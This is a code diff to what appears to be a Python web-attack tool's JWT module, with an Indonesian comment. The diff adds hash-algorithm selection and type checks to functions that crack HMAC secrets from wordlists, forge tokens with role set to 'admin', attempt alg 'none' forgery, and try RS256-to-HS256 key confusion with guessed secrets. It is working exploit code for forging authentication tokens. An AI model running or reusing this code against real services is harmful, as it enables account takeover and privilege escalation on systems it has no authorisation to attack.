@@ -70,7 +70,12 @@ def encode_jwt(header: dict, payload: dict, secret: Optional[str] = None,
         return f"{_b64u(json.dumps(h).encode())}.{_b64u(json.dumps(p).encode())}."
     h.setdefault("alg", "HS256")
     signing = f"{_b64u(json.dumps(h).encode())}.{_b64u(json.dumps(p).encode())}"
-    digest = hmac.new(secret.encode(), signing.encode(), hashlib.sha256).digest()
+    digestmod = {
+        "HS256": hashlib.sha256,
+        "HS384": hashlib.sha384,
+        "HS512": hashlib.sha512,
+    }.get(h.get("alg"), hashlib.sha256)
+    digest = hmac.new(secret.encode(), signing.encode(), digestmod).digest()
     return f"{signing}.{_b64u(digest)}"
 
 
@@ -110,6 +115,8 @@ def crack_hs_secret(token: str, wordlist: Optional[List[str]] = None,
     try:
         header = json.loads(_b64d(parts[0]).decode("utf-8", errors="replace"))
     except Exception:
+        return None
+    if not isinstance(header, dict):
         return None
     alg = header.get("alg", "")
     if alg not in ("HS256", "HS384", "HS512"):
@@ -162,6 +169,8 @@ def run_jwt_attack(base: str, token: str, client: KerisHTTP,
             decoded = json.loads(_b64d(parts[1]).decode("utf-8", errors="replace"))
         except Exception:
             decoded = {}
+        if not isinstance(decoded, dict):
+            decoded = {}
         forged = dict(decoded)
         forged["user"] = username
         forged["role"] = "admin"
@@ -186,6 +195,8 @@ def run_jwt_attack(base: str, token: str, client: KerisHTTP,
         decoded = json.loads(_b64d(parts[1]).decode("utf-8", errors="replace"))
     except Exception:
         decoded = {}
+    if not isinstance(decoded, dict):
+        decoded = {}
     forged_none = dict(decoded)
     forged_none["user"] = username
     forged_none["role"] = "admin"
@@ -207,7 +218,9 @@ def run_jwt_attack(base: str, token: str, client: KerisHTTP,
         header = json.loads(_b64d(parts[0]).decode("utf-8", errors="replace"))
     except Exception:
         header = {}
-    if header.get("alg", "").startswith("RS"):
+    if not isinstance(header, dict):
+        header = {}
+    if str(header.get("alg", "")).startswith("RS"):
         # coba secret = "public" / token itu sendiri (RS256 confusion umum)
         for cand in ("public", "private", "-----BEGIN PUBLIC KEY-----", token):
             if _hmac_valid(parts, cand, "HS256"):
@@ -224,6 +237,8 @@ def run_jwt_attack(base: str, token: str, client: KerisHTTP,
     try:
         payload = json.loads(_b64d(parts[1]).decode("utf-8", errors="replace"))
     except Exception:
+        payload = {}
+    if not isinstance(payload, dict):
         payload = {}
     exp = payload.get("exp")
     if isinstance(exp, (int, float)) and exp < time.time():
